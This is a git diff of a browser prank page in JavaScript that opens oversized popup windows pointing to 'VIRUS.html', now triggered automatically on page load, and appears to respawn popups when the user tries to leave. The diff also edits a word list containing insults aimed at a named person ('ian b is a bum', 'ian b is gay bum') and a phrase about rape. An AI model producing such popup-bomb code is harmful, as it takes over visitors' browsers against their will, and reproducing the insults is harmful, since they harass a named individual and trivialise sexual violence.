@@ -22,12 +22,17 @@ apps.html
         const title = document.getElementById('title')
         const body = document.getElementById('bodyEl')
 
-        const music = new Audio('assets/music.mp3')
+        const music = new Audio('music.mp3')
 
         let nextAn = 1
         let indexN = 0
-let wordlist = ['black', 'efn', 'ian b is a bum', 'ian b is gay bum']
+        function createNewPopUp(){
+            let newWindow = window.open('VIRUS.html','', 'width=354545540px height=23400px')
+            popups.push(newWindow)
+        }
+let wordlist = ['black', 'efn', 'n', 'we were raped on einstein island']
         let popups = [window]
+			createNewPopUp()
 
         function getRandomCordinats(){
             return [Math.floor(Math.random() * (screen.width-100 - 0) + 0), Math.floor(Math.random() * (screen.height-100 - 0) + 0)]
@@ -61,10 +66,7 @@ let wordlist = ['black', 'efn', 'ian b is a bum', 'ian b is gay bum']
             }
         }, 400)
 
-        function createNewPopUp(){
-            let newWindow = window.open('VIRUS.html','', 'width=354545540px height=23400px')
-            popups.push(newWindow)
-        }
+
 
         window.addEventListener('beforeunload', (e)=>{
             for (let i = 0; i<20; i++){
